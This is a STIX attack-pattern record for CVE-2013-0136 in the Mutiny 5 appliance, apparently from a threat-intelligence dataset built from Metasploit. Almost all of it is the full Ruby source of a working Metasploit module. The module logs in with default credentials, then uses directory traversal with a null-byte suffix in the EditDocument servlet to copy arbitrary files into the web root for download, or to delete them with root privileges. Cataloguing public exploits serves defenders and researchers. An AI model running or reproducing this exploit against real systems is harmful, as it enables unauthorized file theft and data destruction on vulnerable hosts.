{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ff9ac80e-a001-431a-9340-ac2932700852",
    "created": "2024-08-14T16:23:05.353467Z",
    "modified": "2024-08-14T16:23:05.353471Z",
    "name": "Mutiny 5 Arbitrary File Read and Delete",
    "description": " This module exploits the EditDocument servlet from the frontend on the Mutiny 5 appliance. The EditDocument servlet provides file operations, such as copy and delete, which are affected by a directory traversal vulnerability. Because of this any authenticated frontend user can read and delete arbitrary files from the system with root privileges. In order to exploit the vulnerability a valid user (any role) in the web frontend is required. The module has been tested successfully on the Mutiny 5.0-1.07 appliance. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/mutiny_frontend_read_delete.rb",
            "external_id": "mutiny_frontend_read_delete.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-0136"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2013/05/15/new-1day-exploits-mutiny-vulnerabilities/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Mutiny 5 Arbitrary File Read and Delete',\n        'Description' => %q{\n          This module exploits the EditDocument servlet from the frontend on the Mutiny 5\n          appliance. The EditDocument servlet provides file operations, such as copy and\n          delete, which are affected by a directory traversal vulnerability. Because of this,\n          any authenticated frontend user can read and delete arbitrary files from the system\n          with root privileges. In order to exploit the vulnerability a valid user (any role)\n          in the web frontend is required. The module has been tested successfully on the\n          Mutiny 5.0-1.07 appliance.\n        },\n        'Author' => [\n          'juan vazquez' # Metasploit module and initial discovery\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'CVE', '2013-0136' ],\n          [ 'US-CERT-VU', '701572' ],\n          [ 'URL', 'https://www.rapid7.com/blog/post/2013/05/15/new-1day-exploits-mutiny-vulnerabilities/' ]\n        ],\n        'Actions' => [\n          ['Read', { 'Description' => 'Read arbitrary file' }],\n          ['Delete', { 'Description' => 'Delete arbitrary file' }]\n        ],\n        'DefaultAction' => 'Read',\n        'DisclosureDate' => '2013-05-15'\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(80),\n        OptString.new('TARGETURI', [true, 'Path to Mutiny Web Service', '/']),\n        OptString.new('USERNAME', [ true, 'The user to authenticate as', 'superadmin@mutiny.com' ]),\n        OptString.new('PASSWORD', [ true, 'The password to authenticate with', 'password' ]),\n        OptString.new('PATH', [ true, 'The file to read or delete' ]),\n      ]\n    )\n  end\n\n  def run\n    print_status('Trying to login')\n    if login\n      print_good('Login Successful')\n    else\n      print_error('Login failed, review USERNAME and PASSWORD options')\n      return\n    end\n\n    case action.name\n    when 'Read'\n      read_file(datastore['PATH'])\n    when 'Delete'\n      delete_file(datastore['PATH'])\n    end\n  end\n\n  def read_file(file)\n    print_status('Copying file to Web location...')\n\n    dst_path = '/usr/jakarta/tomcat/webapps/ROOT/m/'\n    res = send_request_cgi(\n      {\n        'uri' => normalize_uri(target_uri.path, 'interface', 'EditDocument'),\n        'method' => 'POST',\n        'cookie' => \"JSESSIONID=#{@session}\",\n        'encode_params' => false,\n        'vars_post' => {\n          'operation' => 'COPY',\n          'paths[]' => \"../../../../#{file}%00.txt\",\n          'newPath' => \"../../../..#{dst_path}\"\n        }\n      }\n    )\n\n    if res && (res.code == 200) && res.body =~ (/\\{\"success\":true\\}/)\n      print_good(\"File #{file} copied to #{dst_path} successfully\")\n    else\n      print_error(\"Failed to copy #{file} to #{dst_path}\")\n    end\n\n    print_status('Retrieving file contents...')\n\n    res = send_request_cgi(\n      {\n        'uri' => normalize_uri(target_uri.path, 'm', ::File.basename(file)),\n        'method' => 'GET'\n      }\n    )\n\n    if res && (res.code == 200)\n      store_path = store_loot('mutiny.frontend.data', 'application/octet-stream', rhost, res.body, file)\n      print_good(\"File successfully retrieved and saved on #{store_path}\")\n    else\n      print_error('Failed to retrieve file')\n    end\n\n    # Cleanup\n    delete_file(\"#{dst_path}#{::File.basename(file)}\")\n  end\n\n  def delete_file(file)\n    print_status(\"Deleting file #{file}\")\n\n    res = send_request_cgi(\n      {\n        'uri' => normalize_uri(target_uri.path, 'interface', 'EditDocument'),\n        'method' => 'POST',\n        'cookie' => \"JSESSIONID=#{@session}\",\n        'vars_post' => {\n          'operation' => 'DELETE',\n          'paths[]' => \"../../../../#{file}\"\n        }\n      }\n    )\n\n    if res && (res.code == 200) && res.body =~ (/\\{\"success\":true\\}/)\n      print_good(\"File #{file} deleted\")\n    else\n      print_error(\"Error deleting file #{file}\")\n    end\n  end\n\n  def login\n    res = send_request_cgi(\n      {\n        'uri' => normalize_uri(target_uri.path, 'interface', 'index.do'),\n        'method' => 'GET'\n      }\n    )\n\n    if res && (res.code == 200) && res.get_cookies =~ (/JSESSIONID=(.*);/)\n      first_session = ::Regexp.last_match(1)\n    end\n\n    res = send_request_cgi(\n      {\n        'uri' => normalize_uri(target_uri.path, 'interface', 'j_security_check'),\n        'method' => 'POST',\n        'cookie' => \"JSESSIONID=#{first_session}\",\n        'vars_post' => {\n          'j_username' => datastore['USERNAME'],\n          'j_password' => datastore['PASSWORD']\n        }\n      }\n    )\n\n    if !res || (res.code != 302) || res.headers['Location'] !~ (%r{interface/index.do})\n      return false\n    end\n\n    res = send_request_cgi(\n      {\n        'uri' => normalize_uri(target_uri.path, 'interface', 'index.do'),\n        'method' => 'GET',\n        'cookie' => \"JSESSIONID=#{first_session}\"\n      }\n    )\n\n    if res && (res.code == 200) && res.get_cookies =~ (/JSESSIONID=(.*);/)\n      @session = ::Regexp.last_match(1)\n      return true\n    end\n\n    return false\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-05-15"
}